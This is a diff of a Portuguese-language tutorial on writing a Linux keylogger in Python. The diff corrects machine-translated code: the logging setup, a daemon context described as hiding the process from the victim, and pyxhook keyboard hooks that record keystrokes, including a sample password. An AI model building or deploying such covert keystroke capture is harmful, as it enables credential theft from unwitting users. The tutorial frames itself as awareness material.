@@ -9,12 +9,12 @@ Não precisamos de nenhuma preparação específica antes da execução do keylo
 Agora você pode ver que na mesma pasta que nosso **keylogger** está localizado um novo arquivo `activity.log`. Observando o arquivo você pode ver que ele contém todas as teclas que você pressionou em seu teclado após a execução, incluindo sua senha `Passwd`. O invasor pode acessar facilmente esses arquivos e modificar o keylogger para enviá-los em um endereço de e-mail específico ou com uma combinação de diferentes tipos de malware, ele pode obter acesso direto a eles via rede.
 
 ```
-Chave: P
-Chave: um
-Chaves
-Chaves
-Chave: w
-Chave: d
+Key: P
+Key: a
+Key: s
+Key: s
+Key: w
+Key: d
 ```
 
 A criação do **keylogger** é um processo muito simples, conforme descrito abaixo e qualquer pessoa pode fazê-lo apenas com um conhecimento básico de programação e compreensão de sistemas operacionais. É por isso que devemos ser sempre cuidadosos quando executamos qualquer arquivo incomum ou não confiável.
@@ -22,15 +22,15 @@ A criação do **keylogger** é um processo muito simples, conforme descrito aba
 #### Como funciona?
 
  - Em primeiro lugar, configuramos nosso logger. Podemos especificar o arquivo no qual devem ser armazenados os dados, bem como o formato da mensagem.
-   ``` python
+   ```python
    logging.basicConfig(
-       level=log.DEBUG,
-       nomedoarquivo='atividade.log',
-       format='Chave: %(message)s',
+       level=logging.DEBUG,
+       filename='activity.log',
+       format='Key: %(message)s',
    )
    ```
  - Então temos que obter o manipulador do arquivo de log. Explicaremos o porquê no próximo passo.
-   ``` python
+   ```python
    handler = logging.getLogger().handlers[0].stream
    ```
  - Para tornar nosso spyware mais difícil de ser detectado pela vítima, queremos que ele seja executado em segundo plano como um **daemon**.
@@ -40,12 +40,12 @@ A criação do **keylogger** é um processo muito simples, conforme descrito aba
    nosso arquivo de log, a menos que especifiquemos que os arquivos devem ser preservados. Por isso obtivemos
    manipulador de arquivo de log na etapa anterior. No contexto do nosso daemon oculto, agora podemos criar o
    keylogger e inicie sua atividade.
-   ``` python
-   # Daemonize o processo para escondê-lo da vítima.
-   com daemon.DaemonContext(files_preserve=[handler]):
-       # Criar keylogger.
+   ```python
+   # Daemonize the process to hide it from the victim.
+   with daemon.DaemonContext(files_preserve=[handler]):
+       # Create keylogger.
        keylogger = Keylogger('SimpleSpyware')
-       # Inicie a atividade de log do usuário.
+       # Start logging activity of the user.
        keylogger.start_logging()
    ```
   - Para obter os _key press events_ podemos usar um módulo python para Linux chamado `pyxhook`. Se nós
@@ -54,11 +54,12 @@ A criação do **keylogger** é um processo muito simples, conforme descrito aba
     definir um retorno de chamada para esses eventos. Callback é no nosso caso uma função que será chamada cada vez que um novo
     evento é obtido (__keydown_callback_). A única coisa que esse método faz é registrar a chave em nosso
     arquivo especificado `activity.log`.
-    ``` python
+    ```python
     hook_manager = pyxhook.HookManager()
-    # Atribuir retorno de chamada para manipulação de pressionamentos de tecla.
+    # Assign callback for handling key strokes.
     hook_manager.KeyDown = self._keydown_callback
-    # Conecte o teclado e comece a registrar.
+    # Hook the keyboard and start logging.
     hook_manager.HookKeyboard()
     hook_manager.start()
     ```
+
